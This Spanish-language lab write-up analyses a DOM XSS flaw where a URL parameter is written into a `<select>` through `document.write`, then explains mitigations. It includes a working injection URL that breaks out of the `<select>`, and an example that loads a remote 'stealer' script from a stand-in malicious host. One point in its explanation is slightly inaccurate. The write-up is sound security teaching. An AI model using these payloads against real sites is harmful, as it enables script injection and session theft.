# **Análisis de la Vulnerabilidad: DOM XSS en `document.write` usando `location.search` dentro de un `<select>`**

### **1. Código vulnerable**
El código relevante en la aplicación es el siguiente:

```html
<script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
```

---

### **2. Explicación del flujo de ejecución**
Vamos a analizar lo que hace este código **paso por paso**:

1. **Obtención del parámetro `storeId` desde la URL**
   ```js
   var store = (new URLSearchParams(window.location.search)).get('storeId');
   ```
   - `window.location.search` devuelve la **parte de la URL después del `?`**, es decir, los parámetros GET.
   - `new URLSearchParams(...).get('storeId')` extrae el valor del parámetro `storeId`.

2. **Construcción del `<select>` con `document.write()`**
   ```js
   document.write('<select name="storeId">');
   ```
   - Este código inicia la creación de un menú desplegable `<select>`.

3. **Si `store` tiene un valor, se inserta dentro de un `<option>`**
   ```js
   if(store) {
       document.write('<option selected>'+store+'</option>');
   }
   ```
   - Aquí está el problema: **el valor de `storeId` se inserta directamente sin ser sanitizado**.
   - Como `document.write()` procesa la cadena **como HTML**, cualquier etiqueta maliciosa en `storeId` **se interpretará y ejecutará**.

4. **Se agregan opciones predefinidas**
   ```js
   for(var i=0;i<stores.length;i++) {
       if(stores[i] === store) {
           continue;
       }
       document.write('<option>'+stores[i]+'</option>');
   }
   ```
   - Esto simplemente agrega las opciones predefinidas (`London`, `Paris`, `Milan`), a menos que coincidan con `storeId`.

5. **Cierre del `<select>`**
   ```js
   document.write('</select>');
   ```
   - Este cierre debería cerrar correctamente el `<select>`, **pero el atacante puede manipularlo**.

---

### **3. Explotación de la vulnerabilidad**
Si el usuario accede a la siguiente URL maliciosa:

```
https://0ac400f4046847bdb790f7d600e900c2.web-security-academy.net/product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
```

**Decodificación del valor de `storeId`:**
```html
storeId="></select><img src=1 onerror=alert(1)>
```

#### **Paso a paso de cómo el payload se ejecuta**

1. **El parámetro `storeId` se obtiene y se almacena en la variable `store`**
   ```js
   var store = '"></select><img src=1 onerror=alert(1)>';
   ```

2. **Cuando se ejecuta `document.write('<option selected>'+store+'</option>');`, el contenido de `store` se inserta en el HTML:**
   ```html
   <option selected=""></select><img src=1 onerror=alert(1)></option>
   ```

3. **Efecto de la inyección**
   - **`">`**: Termina el atributo `selected=""`, cerrando la etiqueta `<option>`.
   - **`</select>`**: **Cierra el `<select>` prematuramente**, antes de lo previsto por el código original.
   - **`<img src=1 onerror=alert(1)>`**: Inyecta una imagen con un evento `onerror`. Dado que `src=1` es una ruta inválida, se ejecuta el código JavaScript `alert(1)`.

4. **Resultado final en el DOM**
   ```html
   <select name="storeId">
       <option selected=""></option>
   </select>
   <img src=1 onerror=alert(1)>
   ```
   - Ahora tenemos una imagen en la página con un `onerror` malicioso que ejecuta `alert(1)`.

---

### **4. Impacto de la vulnerabilidad**
Esta vulnerabilidad permite a un atacante **inyectar código JavaScript arbitrario**, lo que puede provocar:

✅ **Robo de cookies y credenciales**:  
   - Un atacante podría leer `document.cookie` y enviarlo a un servidor externo para **robar sesiones**.

✅ **Secuestro de cuenta (Account Takeover)**:  
   - Si el usuario afectado es un administrador, el atacante podría realizar acciones en su nombre.

✅ **Ataques de phishing y manipulación de la interfaz**:  
   - Se podrían modificar elementos de la página para **falsificar formularios** y robar información.

✅ **Carga de scripts externos maliciosos**:  
   - Un atacante podría inyectar:
     ```html
     <script src="https://malicious.com/stealer.js"></script>
     ```
     para ejecutar código remoto.

---

### **5. Cómo mitigar la vulnerabilidad**
#### **✔️ Opción 1: Evitar `document.write()`**
El uso de `document.write()` **es una mala práctica de seguridad** y debe evitarse.  
En su lugar, usar `createElement` y `textContent`:

```js
var store = (new URLSearchParams(window.location.search)).get('storeId');
var select = document.createElement("select");
select.name = "storeId";

if (store) {
    var option = document.createElement("option");
    option.selected = true;
    option.textContent = store;  // Protege contra XSS
    select.appendChild(option);
}

document.body.appendChild(select);
```
✅ **`textContent` escapa automáticamente el texto, evitando la inyección de HTML.**

---

#### **✔️ Opción 2: Validar y sanitizar la entrada**
Si `storeId` solo debe contener nombres de tiendas válidos, podemos **verificar que su valor sea permitido**:

```js
var allowedStores = ["London", "Paris", "Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');

if (!allowedStores.includes(store)) {
    store = "London";  // Valor por defecto seguro
}
```
✅ **Esto impide que un atacante inyecte código malicioso.**

---

#### **✔️ Opción 3: Usar bibliotecas seguras**
Si es necesario manejar HTML dinámico, se recomienda usar una **biblioteca de sanitización**, como **DOMPurify**:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.8/purify.min.js"></script>
<script>
    var store = DOMPurify.sanitize((new URLSearchParams(window.location.search)).get('storeId'));
    document.write('<select name="storeId"><option>' + store + '</option></select>');
</script>
```
✅ **DOMPurify elimina cualquier script malicioso de la entrada del usuario.**

---

### **Conclusión**
Esta vulnerabilidad ocurre porque `document.write()` inserta datos no validados directamente en el HTML, permitiendo a un atacante **cerrar etiquetas y ejecutar JavaScript malicioso**. Para prevenir este tipo de ataques, **se deben evitar métodos inseguros de manipulación del DOM y validar correctamente la entrada del usuario**.
